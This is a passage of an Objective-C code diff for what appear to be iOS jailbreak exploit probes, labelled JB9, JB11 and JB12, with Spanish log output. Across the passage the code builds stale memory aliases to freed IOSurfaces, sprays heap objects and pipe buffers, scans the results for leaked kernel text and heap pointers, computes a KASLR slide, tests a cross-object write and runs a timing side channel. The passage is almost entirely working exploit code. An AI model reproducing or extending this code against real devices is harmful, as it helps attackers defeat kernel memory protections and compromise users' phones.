+        SetValueFn setValue = (SetValueFn)dlsym(h, "IOSurfaceSetValue");
+        CopyAllValuesFn copyAllValues = (CopyAllValuesFn)dlsym(h, "IOSurfaceCopyAllValues");
 
-        if (!createSurf || !getBase || !makeEntry) {
-            dlclose(h); done(@{@"error": @"dlsym"}); return;
+        if (!createSurf || !setValue || !copyAllValues) {
+            dlclose(h);
+            done(@{@"error": @"dlsym"});
+            return;
         }
 
-        uint32_t kernTextPtrs = 0;
-        uint32_t kernHeapPtrs = 0;
-        uint32_t pipeHits = 0;
+        int sprayCount = 64;
+        uint32_t staleHits = 0;
+        uint32_t kernelPtrs = 0;
         uint64_t bestPtr = 0;
+        double avgSetTime = 0;
+        double avgCopyTime = 0;
 
-        log(@"JB9: --- Paso 1: Crear superficie + alias stale ---");
-        NSDictionary *props = @{
-            @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
-            @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @(0x42475241),
-            @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
-        };
-        IOSurfaceRef surf = createSurf((__bridge CFDictionaryRef)props);
-        if (!surf) {
-            NSDictionary *fb = @{ @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
-                @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @(0x42475241) };
-            surf = createSurf((__bridge CFDictionaryRef)fb);
-        }
-        if (!surf) { dlclose(h); done(@{@"error": @"create"}); return; }
-
-        size_t allocSz = getAllocSz ? getAllocSz(surf) : 0;
-        if (lockS) { uint32_t s = 0; lockS(surf, 3, &s); }
-        void *base = getBase(surf);
-        if (!base || allocSz == 0) {
-            if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
-            CFRelease(surf); dlclose(h); done(@{@"error": @"no_base"}); return;
-        }
-        uint32_t marker = 0xDEAD9999;
-        memcpy(base, &marker, 4);
-        if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
-
-        mach_port_t entryPort = MACH_PORT_NULL;
-        memory_object_size_t entrySize = (memory_object_size_t)allocSz;
-        makeEntry(mach_task_self(), &entrySize, (memory_object_offset_t)(uintptr_t)base,
-            VM_PROT_READ | VM_PROT_WRITE, &entryPort, MACH_PORT_NULL);
-
-        vm_address_t alias = 0;
-        vm_map(mach_task_self(), &alias, (vm_size_t)entrySize, 0, VM_FLAGS_ANYWHERE,
-            entryPort, 0, FALSE, VM_PROT_READ | VM_PROT_WRITE,
-            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
-
-        log(@"JB9: --- Paso 2: CFRelease superficie ---");
-        CFRelease(surf); surf = NULL;
-
-        int (*pipeFds)[2] = NULL;
-        int pipeCount = 0;
-
-        if (!isr_stopped()) {
-            log(@"JB9: --- Paso 3: Spray 512 pipe pairs con buffers 16KB ---");
-            pipeFds = (int (*)[2])calloc(512, sizeof(int[2]));
-            uint8_t *pipeBuf = (uint8_t *)calloc(1, 16384);
-
-            for (int i = 0; i < 512 && !isr_stopped(); i++) {
-                if (pipe(pipeFds[i]) != 0) break;
-
-                fcntl(pipeFds[i][1], F_SETFL, O_NONBLOCK);
-                fcntl(pipeFds[i][0], F_SETFL, O_NONBLOCK);
-
-                if (pipeBuf) {
-                    uint32_t pipeMark = 0xEE990000 | (uint32_t)i;
-                    memcpy(pipeBuf, &pipeMark, 4);
-                    for (int j = 8; j < 16384; j += 8) {
-                        uint64_t pat = 0x9999999900000000ULL | (uint64_t)((i << 12) | j);
-                        memcpy(pipeBuf + j, &pat, 8);
-                    }
-                    ssize_t w = write(pipeFds[i][1], pipeBuf, 16384);
-                    if (w > 0) pipeCount++;
-                }
-            }
-            if (pipeBuf) free(pipeBuf);
-            log([NSString stringWithFormat:@"JB9: Pipes creados: %d/512", pipeCount]);
+        log(@"JB11: --- Paso 1: Crear 64 superficies y spray propiedades 4KB ---");
+        IOSurfaceRef *surfs = (IOSurfaceRef *)calloc(sprayCount, sizeof(IOSurfaceRef));
+        if (!surfs) {
+            dlclose(h);
+            done(@{@"error": @"alloc"});
+            return;
         }
 
         if (!isr_stopped()) {
-            log(@"JB9: --- Paso 4: Spray IOSurfaces para forzar reciclaje ---");
-            IOSurfaceRef *sprays = (IOSurfaceRef *)calloc(50, sizeof(IOSurfaceRef));
-            int sprayed = 0;
-            for (int i = 0; i < 50 && !isr_stopped(); i++) {
-                sprays[i] = createSurf((__bridge CFDictionaryRef)props);
-                if (!sprays[i]) break;
-                sprayed++;
-            }
-            log([NSString stringWithFormat:@"JB9: IOSurface spray: %d/50", sprayed]);
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @32,
+                @"IOSurfaceHeight": @32,
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfacePixelFormat": @(0x42475241),
+            };
 
-            log(@"JB9: --- Paso 5: Escaneo del alias buscando pipe/kernel data ---");
-            if (!isr_stopped()) {
-                size_t scanSz = entrySize < 16384 ? (size_t)entrySize : 16384;
-                uint32_t firstWord = 0;
-                memcpy(&firstWord, (void*)alias, 4);
-                log([NSString stringWithFormat:@"JB9: Alias[0]=0x%08X (marker=0xDEAD9999)", firstWord]);
-                log([NSString stringWithFormat:@"JB9: Reclamado: %s", (firstWord != marker) ? "SI" : "NO"]);
+            uint8_t *blob = (uint8_t *)calloc(1, 4096);
+            double totalSetTime = 0;
+            int setCount = 0;
+            for (int i = 0; i < sprayCount && !isr_stopped(); i++) {
+                surfs[i] = createSurf((__bridge CFDictionaryRef)props);
+                if (!surfs[i]) continue;
 
-                for (size_t off = 0; off + 8 <= scanSz && !isr_stopped(); off += 4) {
-                    uint64_t val = 0;
-                    memcpy(&val, (void*)(alias + off), 8);
+                uint32_t mark = 0xBB110000 | (uint32_t)i;
+                for (int j = 0; j < 4096/4; j++)
+                    ((uint32_t*)blob)[j] = mark;
 
-                    if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
-                        kernTextPtrs++;
-                        if (kernTextPtrs <= 10)
-                            log([NSString stringWithFormat:@"JB9: *** KERN TEXT @ +0x%zx: 0x%016llx ***",
-                                 off, (unsigned long long)val]);
-                        if (bestPtr == 0 || val < bestPtr) bestPtr = val;
-                    }
-                    if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFFE000000000ULL) {
-                        kernHeapPtrs++;
-                        if (kernHeapPtrs <= 10)
-                            log([NSString stringWithFormat:@"JB9: *** KERN HEAP @ +0x%zx: 0x%016llx ***",
-                                 off, (unsigned long long)val]);
-                    }
-                    if ((val & 0xFFFFFFFF00000000ULL) == 0x9999999900000000ULL ||
-                        (val & 0xFFFF000000000000ULL) == 0xEE99000000000000ULL) {
-                        pipeHits++;
-                    }
-                }
-
-                log([NSString stringWithFormat:@"JB9: kernText=%u kernHeap=%u pipeHits=%u", kernTextPtrs, kernHeapPtrs, pipeHits]);
-
-                if (kernTextPtrs > 0) {
-                    uint64_t slide = bestPtr - 0xfffffff007004000ULL;
-                    log([NSString stringWithFormat:@"JB9: *** POSIBLE KASLR SLIDE: 0x%llx ***", (unsigned long long)slide]);
-                }
-
-                log(@"JB9: Primeros 128 bytes del alias:");
-                for (int i = 0; i < 128 && i < (int)scanSz; i += 32) {
-                    uint64_t a = 0, b = 0, c = 0, d = 0;
-                    memcpy(&a, (void*)(alias + i), 8);
-                    memcpy(&b, (void*)(alias + i + 8), 8);
-                    memcpy(&c, (void*)(alias + i + 16), 8);
-                    memcpy(&d, (void*)(alias + i + 24), 8);
-                    log([NSString stringWithFormat:@"JB9: +%03d: %016llx %016llx %016llx %016llx",
-                         i, (unsigned long long)a, (unsigned long long)b,
-                         (unsigned long long)c, (unsigned long long)d]);
+                NSData *data = [NSData dataWithBytes:blob length:4096];
+                for (int p = 0; p < 8; p++) {
+                    NSString *key = [NSString stringWithFormat:@"JB11_spray_%d_%d", i, p];
+                    uint64_t t0 = clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW);
+                    setValue(surfs[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)data);
+                    uint64_t t1 = clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW);
+                    totalSetTime += (t1 - t0);
+                    setCount++;
                 }
             }
+            free(blob);
+            if (setCount > 0) avgSetTime = totalSetTime / setCount / 1000.0;
+            log([NSString stringWithFormat:@"JB11: Sprayed %d propiedades, avgSetTime=%.1f µs", setCount, avgSetTime]);
+        }
 
-            log(@"JB9: --- Paso 6: Verificar si alias tiene pipe data escribiendo ---");
-            if (!isr_stopped() && pipeHits > 0) {
-                uint32_t poison = 0x41414141;
-                memcpy((void*)alias, &poison, 4);
-                log(@"JB9: Escribi 0x41414141 en alias — si hay pipe buffer, el pipe read lo vera");
+        log(@"JB11: --- Paso 2: Liberar las 64 superficies ---");
+        if (!isr_stopped()) {
+            for (int i = 0; i < sprayCount; i++) {
+                if (surfs[i]) { CFRelease(surfs[i]); surfs[i] = NULL; }
+            }
+            log(@"JB11: 64 superficies liberadas — kalloc chunks freed");
+            usleep(50000);
+        }
 
-                uint8_t *readBuf = (uint8_t *)calloc(1, 16384);
-                if (readBuf) {
-                    for (int i = 0; i < pipeCount && i < 512; i++) {
-                        ssize_t r = read(pipeFds[i][0], readBuf, 16384);
-                        if (r > 0) {
-                            uint32_t first = 0;
-                            memcpy(&first, readBuf, 4);
-                            if (first == poison) {
-                                log([NSString stringWithFormat:@"JB9: *** PIPE[%d] LEE NUESTRO POISON 0x41414141 — CROSS-OBJECT WRITE ***", i]);
+        log(@"JB11: --- Paso 3: Crear 64 nuevas superficies y leer propiedades ---");
+        if (!isr_stopped()) {
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @32,
+                @"IOSurfaceHeight": @32,
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfacePixelFormat": @(0x42475241),
+            };
+
+            double totalCopyTime = 0;
+            int copyCount = 0;
+            for (int i = 0; i < sprayCount && !isr_stopped(); i++) {
+                surfs[i] = createSurf((__bridge CFDictionaryRef)props);
+                if (!surfs[i]) continue;
+
+                uint64_t t0 = clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW);
+                CFDictionaryRef allVals = copyAllValues(surfs[i]);
+                uint64_t t1 = clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW);
+                totalCopyTime += (t1 - t0);
+                copyCount++;
+
+                if (allVals) {
+                    NSDictionary *dict = (__bridge NSDictionary *)allVals;
+                    for (NSString *key in dict) {
+                        id val = dict[key];
+                        if ([val isKindOfClass:[NSData class]]) {
+                            NSData *d = (NSData *)val;
+                            const uint8_t *bytes = (const uint8_t *)[d bytes];
+                            NSUInteger len = [d length];
+                            for (NSUInteger off = 0; off + 8 <= len; off += 8) {
+                                uint64_t v = 0;
+                                memcpy(&v, bytes + off, 8);
+                                if ((v & 0xFFFF000000000000ULL) == 0xBB11000000000000ULL) {
+                                    staleHits++;
+                                    if (staleHits <= 5)
+                                        log([NSString stringWithFormat:@"JB11: *** STALE MARKER 0x%llx en key=%@ off=%lu ***",
+                                             (unsigned long long)v, key, (unsigned long)off]);
+                                }
+                                if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    kernelPtrs++;
+                                    if (!bestPtr) bestPtr = v;
+                                    log([NSString stringWithFormat:@"JB11: *** KERNEL PTR 0x%llx en key=%@ ***", (unsigned long long)v, key]);
+                                }
                             }
                         }
                     }
-                    free(readBuf);
+                    CFRelease(allVals);
+                }
+            }
+            if (copyCount > 0) avgCopyTime = totalCopyTime / copyCount / 1000.0;
+            log([NSString stringWithFormat:@"JB11: %d CopyAllValues, avgCopyTime=%.1f µs", copyCount, avgCopyTime]);
+        }
+
+        log(@"JB11: --- Paso 4: Timing side-channel (repetir SetValue/CopyAllValues) ---");
+        if (!isr_stopped()) {
+            double fastSet = 1e18, slowSet = 0;
+            double fastCopy = 1e18, slowCopy = 0;
+            for (int i = 0; i < sprayCount && surfs[i] && !isr_stopped(); i++) {
+                uint8_t small[64];
+                memset(small, 0x42, 64);
+                NSData *sd = [NSData dataWithBytes:small length:64];
+                NSString *tk = [NSString stringWithFormat:@"JB11_timing_%d", i];
+
+                uint64_t t0 = clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW);
+                setValue(surfs[i], (__bridge CFStringRef)tk, (__bridge CFTypeRef)sd);
+                uint64_t t1 = clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW);
+                double dt = (t1 - t0) / 1000.0;
+                if (dt < fastSet) fastSet = dt;
+                if (dt > slowSet) slowSet = dt;
+
+                t0 = clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW);
+                CFDictionaryRef cv = copyAllValues(surfs[i]);
+                t1 = clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW);
+                dt = (t1 - t0) / 1000.0;
+                if (dt < fastCopy) fastCopy = dt;
+                if (dt > slowCopy) slowCopy = dt;
+                if (cv) CFRelease(cv);
+            }
+            log([NSString stringWithFormat:@"JB11: Timing SetValue: min=%.1fµs max=%.1fµs", fastSet, slowSet]);
+            log([NSString stringWithFormat:@"JB11: Timing CopyAll: min=%.1fµs max=%.1fµs", fastCopy, slowCopy]);
+        }
+
+        for (int i = 0; i < sprayCount; i++) {
+            if (surfs[i]) CFRelease(surfs[i]);
+        }
+        free(surfs);
+
+        log(@"JB11: ========================================");
+        log([NSString stringWithFormat:@"JB11: RESULTADO: staleHits=%u kernelPtrs=%u bestPtr=0x%llx avgSet=%.1fµs avgCopy=%.1fµs",
+             staleHits, kernelPtrs, (unsigned long long)bestPtr, avgSetTime, avgCopyTime]);
+        log(@"JB11: ========================================");
+        dlclose(h);
+        done(@{
+            @"staleHits": @(staleHits), @"kernelPtrs": @(kernelPtrs),
+            @"bestKernelPtr": [NSString stringWithFormat:@"0x%llx", (unsigned long long)bestPtr],
+            @"avgSetTimeMicros": @(avgSetTime), @"avgCopyTimeMicros": @(avgCopyTime)
+        });
+    });
+}
+
+#pragma mark - Probe JB12: Exhaustive Kernel Info Harvest
+
+void iosurface_kernel_info_harvest(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        log(@"JB12: ========================================");
+        log(@"JB12: Exhaustive Kernel Info Harvest");
+        log(@"JB12: commpage + task_info + host_info + vm_region");
+        log(@"JB12: ========================================");
+
+        uint32_t totalInfoPtrs = 0;
+        uint64_t kaslrSlide = 0;
+        uint64_t dyldInfoAddr = 0;
+        uint64_t vmMin = 0;
+        uint64_t vmMax = 0;
+        uint32_t regionCount = 0;
+        uint32_t interestingRegions = 0;
+
+        log(@"JB12: --- Paso 1: Commpage read (arm64 userland) ---");
+        if (!isr_stopped()) {
+            volatile uint64_t *commpage = (volatile uint64_t *)0x0000000FFFFFC000ULL;
+            int commpageReadable = 0;
+            for (int off = 0; off < 128 && !isr_stopped(); off++) {
+                @try {
+                    uint64_t v = commpage[off];
+                    if (off < 16) {
+                        log([NSString stringWithFormat:@"JB12: commpage[%d] = 0x%llx", off, (unsigned long long)v]);
+                    }
+                    if (v != 0) commpageReadable++;
+                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        totalInfoPtrs++;
+                        log([NSString stringWithFormat:@"JB12: *** COMMPAGE KERNEL PTR [%d]: 0x%llx ***", off, (unsigned long long)v]);
+                    }
+                } @catch (NSException *e) {
+                    if (off == 0) log(@"JB12: Commpage no legible (exception)");
+                    break;
+                }
+            }
+            log([NSString stringWithFormat:@"JB12: Commpage: %d valores no-cero leídos", commpageReadable]);
+        }
+
+        log(@"JB12: --- Paso 2: task_info harvest ---");
+        if (!isr_stopped()) {
+            // TASK_BASIC_INFO (4)
+            struct task_basic_info bi;
+            mach_msg_type_number_t biCnt = TASK_BASIC_INFO_COUNT;
+            if (task_info(mach_task_self(), TASK_BASIC_INFO, (task_info_t)&bi, &biCnt) == KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"JB12: BASIC: suspend=%d vsize=%lu rsize=%lu",
+                     bi.suspend_count, (unsigned long)bi.virtual_size, (unsigned long)bi.resident_size]);
+            }
+
+            // TASK_EVENTS_INFO (2)
+            struct task_events_info ei;
+            mach_msg_type_number_t eiCnt = TASK_EVENTS_INFO_COUNT;
+            if (task_info(mach_task_self(), TASK_EVENTS_INFO, (task_info_t)&ei, &eiCnt) == KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"JB12: EVENTS: faults=%d pageins=%d cow=%d msgs_sent=%d msgs_recv=%d syscalls_mach=%d syscalls_unix=%d",
+                     ei.faults, ei.pageins, ei.cow_faults, ei.messages_sent, ei.messages_received, ei.syscalls_mach, ei.syscalls_unix]);
+            }
+
+            // TASK_THREAD_TIMES_INFO (3)
+            struct task_thread_times_info tti;
+            mach_msg_type_number_t ttiCnt = TASK_THREAD_TIMES_INFO_COUNT;
+            if (task_info(mach_task_self(), TASK_THREAD_TIMES_INFO, (task_info_t)&tti, &ttiCnt) == KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"JB12: THREAD_TIMES: user=%d.%06d sys=%d.%06d",
+                     tti.user_time.seconds, tti.user_time.microseconds,
+                     tti.system_time.seconds, tti.system_time.microseconds]);
+            }
+
+            // TASK_DYLD_INFO (17)
+            task_dyld_info_data_t di;
+            mach_msg_type_number_t diCnt = TASK_DYLD_INFO_COUNT;
+            if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&di, &diCnt) == KERN_SUCCESS) {
+                dyldInfoAddr = di.all_image_info_addr;
+                log([NSString stringWithFormat:@"JB12: DYLD: all_image_info_addr=0x%llx size=%llu",
+                     di.all_image_info_addr, di.all_image_info_size]);
+                if (dyldInfoAddr > 0) totalInfoPtrs++;
+            }
+
+            // TASK_VM_INFO (22)
+            struct task_vm_info vi;
+            mach_msg_type_number_t viCnt = TASK_VM_INFO_COUNT;
+            if (task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&vi, &viCnt) == KERN_SUCCESS) {
+                vmMin = vi.min_address;
+                vmMax = vi.max_address;
+                log([NSString stringWithFormat:@"JB12: VM_INFO: vsize=%llu rsize=%llu rsize_peak=%llu",
+                     vi.virtual_size, vi.resident_size, vi.resident_size_peak]);
+                log([NSString stringWithFormat:@"JB12: VM_INFO: min=0x%llx max=0x%llx phys_footprint=%llu",
+                     vi.min_address, vi.max_address, vi.phys_footprint]);
+                log([NSString stringWithFormat:@"JB12: VM_INFO: page_size=%d purgeable=%llu reusable=%llu",
+                     vi.page_size, vi.purgeable_volatile_pmap, vi.purgeable_volatile_resident]);
+            }
+
+            // TASK_EXTMOD_INFO (19)
+            struct task_extmod_info emi;
+            mach_msg_type_number_t emiCnt = TASK_EXTMOD_INFO_COUNT;
+            if (task_info(mach_task_self(), TASK_EXTMOD_INFO, (task_info_t)&emi, &emiCnt) == KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"JB12: EXTMOD: task_uuid present, info_size=%u", emiCnt]);
+            } else {
+                log(@"JB12: EXTMOD: no disponible");
+            }
+        }
+
+        log(@"JB12: --- Paso 3: host_info harvest ---");
+        if (!isr_stopped()) {
+            // HOST_VM_INFO (2)
+            vm_statistics_data_t vmstat;
+            mach_msg_type_number_t vmCnt = HOST_VM_INFO_COUNT;
+            if (host_statistics(mach_host_self(), HOST_VM_INFO, (host_info_t)&vmstat, &vmCnt) == KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"JB12: HOST_VM: free=%u active=%u inactive=%u wire=%u",
+                     vmstat.free_count, vmstat.active_count, vmstat.inactive_count, vmstat.wire_count]);
+                log([NSString stringWithFormat:@"JB12: HOST_VM: faults=%u pageouts=%u pageins=%u",
+                     vmstat.faults, vmstat.pageouts, vmstat.pageins]);
+            }
+
+            // KERNEL_BOOT_INFO (7)
+            kernel_boot_info_t bootInfo;
+            mach_msg_type_number_t bootCnt = KERNEL_BOOT_INFO_MAX_SIZE;
+            if (host_get_boot_info(mach_host_self(), bootInfo) == KERN_SUCCESS) {
+                NSString *bi = [NSString stringWithUTF8String:bootInfo];
+                log([NSString stringWithFormat:@"JB12: BOOT_INFO: %@", bi]);
+            } else {
+                log(@"JB12: BOOT_INFO: no disponible");
+            }
+
+            // HOST_BASIC_INFO
+            host_basic_info_data_t hbi;
+            mach_msg_type_number_t hbiCnt = HOST_BASIC_INFO_COUNT;
+            if (host_info(mach_host_self(), HOST_BASIC_INFO, (host_info_t)&hbi, &hbiCnt) == KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"JB12: HOST_BASIC: cpus=%d max_cpus=%d mem=%llu cpu_type=%d cpu_subtype=%d",
+                     hbi.avail_cpus, hbi.max_cpus, hbi.max_mem, hbi.cpu_type, hbi.cpu_subtype]);
+            }
+
+            // HOST_PRIORITY_INFO
+            host_priority_info_data_t hpi;
+            mach_msg_type_number_t hpiCnt = HOST_PRIORITY_INFO_COUNT;
+            if (host_info(mach_host_self(), HOST_PRIORITY_INFO, (host_info_t)&hpi, &hpiCnt) == KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"JB12: HOST_PRIORITY: kern=%d sys=%d server=%d user=%d depress=%d idle=%d min=%d max=%d",
+                     hpi.kernel_priority, hpi.system_priority, hpi.server_priority, hpi.user_priority,
+                     hpi.depress_priority, hpi.idle_priority, hpi.minimum_priority, hpi.maximum_priority]);
+            }
+        }
+
+        log(@"JB12: --- Paso 4: vm_region_recurse_64 scan ---");
+        if (!isr_stopped()) {
+            vm_address_t addr = 0;
+            vm_size_t size = 0;
+            uint32_t depth = 0;
+            struct vm_region_submap_info_64 info;
+            mach_msg_type_number_t infoCnt;
+
+            while (!isr_stopped() && regionCount < 2000) {
+                infoCnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                depth = 128;
+                kern_return_t kr = vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
+                    (vm_region_recurse_info_t)&info, &infoCnt);
+                if (kr != KERN_SUCCESS) break;
+
+                regionCount++;
+                BOOL interesting = NO;
+                if (info.share_mode == SM_TRUESHARED || info.share_mode == SM_SHARED) interesting = YES;
+                if (info.user_tag == 0 && (info.protection & VM_PROT_EXECUTE)) interesting = YES;
+                if (info.max_protection == (VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE)) interesting = YES;
+                if (addr >= 0xFFFFFE0000000000ULL) interesting = YES;
+
+                if (interesting) {
+                    interestingRegions++;
+                    if (interestingRegions <= 30) {
+                        log([NSString stringWithFormat:@"JB12: REGION 0x%llx-0x%llx sz=%lluKB prot=%d/%d share=%d tag=%d depth=%u",
+                             (unsigned long long)addr, (unsigned long long)(addr + size),
+                             (unsigned long long)(size / 1024),
+                             info.protection, info.max_protection,
+                             info.share_mode, info.user_tag, depth]);
+                    }
+                    if (addr >= 0xFFFFFE0000000000ULL) {
+                        totalInfoPtrs++;
+                        log([NSString stringWithFormat:@"JB12: *** HIGH-ADDRESS REGION 0x%llx ***", (unsigned long long)addr]);
+                    }
+                }
+                addr += size;
+                if (addr == 0) break;
+            }
+            log([NSString stringWithFormat:@"JB12: Total regions: %u interesting: %u", regionCount, interestingRegions]);
+        }
+
+        log(@"JB12: --- Paso 5: KASLR slide calculation ---");
+        if (!isr_stopped()) {
+            if (dyldInfoAddr > 0) {
+                log([NSString stringWithFormat:@"JB12: DYLD all_image_info=0x%llx (userland pointer, no KASLR directo)", dyldInfoAddr]);
+            }
+
+            // Read dyld_all_image_infos to find kernel cache slide if accessible
+            if (dyldInfoAddr > 0) {
+                @try {
+                    struct {
+                        uint32_t version;
+                        uint32_t infoArrayCount;
+                        uint64_t infoArray;
+                        uint64_t notification;
+                        uint8_t processDetachedFromSharedRegion;
+                        uint8_t libSystemInitialized;
+                        uint8_t pad[2];
+                        uint64_t dyldImageLoadAddress;
+                    } *dyldInfo = (void *)(uintptr_t)dyldInfoAddr;
+                    log([NSString stringWithFormat:@"JB12: dyld version=%u imageCount=%u infoArray=0x%llx dyldBase=0x%llx",
+                         dyldInfo->version, dyldInfo->infoArrayCount,
+                         (unsigned long long)dyldInfo->infoArray,
+                         (unsigned long long)dyldInfo->dyldImageLoadAddress]);
+                    totalInfoPtrs += 2;
+                } @catch (NSException *e) {
+                    log(@"JB12: dyld_all_image_infos no legible");
                 }
             }
 
-            log(@"JB9: --- Paso 7: Task info ---");
-            if (!isr_stopped()) {
-                task_dyld_info_data_t di;
-                mach_msg_type_number_t dc = TASK_DYLD_INFO_COUNT;
-                if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&di, &dc) == KERN_SUCCESS)
-                    log([NSString stringWithFormat:@"JB9: DYLD info=0x%llx", di.all_image_info_addr]);
-
-                struct task_vm_info vi;
-                mach_msg_type_number_t vc = TASK_VM_INFO_COUNT;
-                if (task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&vi, &vc) == KERN_SUCCESS)
-                    log([NSString stringWithFormat:@"JB9: VM min=0x%llx max=0x%llx", vi.min_address, vi.max_address]);
-            }
-
-            for (int i = 0; i < sprayed; i++) {
-                if (sprays[i]) CFRelease(sprays[i]);
-            }
-            free(sprays);
+            uint64_t unslid = 0xFFFFFFF007004000ULL;
+            log([NSString stringWithFormat:@"JB12: Para calcular KASLR slide, necesitamos un puntero kernel text (unslid base=0x%llx)", unslid]);
+            log([NSString stringWithFormat:@"JB12: Total info ptrs encontrados: %u", totalInfoPtrs]);
         }
 
-        if (pipeFds) {
-            for (int i = 0; i < 512; i++) {
-                if (pipeFds[i][0]) close(pipeFds[i][0]);
-                if (pipeFds[i][1]) close(pipeFds[i][1]);
-            }
-            free(pipeFds);
-        }
-
-        vm_deallocate(mach_task_self(), alias, (vm_size_t)entrySize);
-        mach_port_deallocate(mach_task_self(), entryPort);
-
-        log(@"JB9: ========================================");
-        log([NSString stringWithFormat:@"JB9: RESULTADO: kernText=%u kernHeap=%u pipeHits=%u bestPtr=0x%llx",
-             kernTextPtrs, kernHeapPtrs, pipeHits, (unsigned long long)bestPtr]);
-        log(@"JB9: ========================================");
-        dlclose(h);
+        log(@"JB12: ========================================");
+        log([NSString stringWithFormat:@"JB12: RESULTADO: totalInfoPtrs=%u regions=%u interesting=%u dyld=0x%llx vmRange=0x%llx-0x%llx",
+             totalInfoPtrs, regionCount, interestingRegions, dyldInfoAddr, vmMin, vmMax]);
+        log(@"JB12: ========================================");
         done(@{
-            @"kernelTextPtrs": @(kernTextPtrs), @"kernelHeapPtrs": @(kernHeapPtrs),
-            @"pipeHits": @(pipeHits), @"bestKernelPtr": [NSString stringWithFormat:@"0x%llx", (unsigned long long)bestPtr]
+            @"totalInfoPtrs": @(totalInfoPtrs),
+            @"regionCount": @(regionCount),
+            @"interestingRegions": @(interestingRegions),
+            @"dyldInfoAddr": [NSString stringWithFormat:@"0x%llx", dyldInfoAddr],
+            @"vmMin": [NSString stringWithFormat:@"0x%llx", vmMin],
+            @"vmMax": [NSString stringWithFormat:@"0x%llx", vmMax],
+            @"kaslrSlide": [NSString stringWithFormat:@"0x%llx", kaslrSlide]
         });
     });
 }
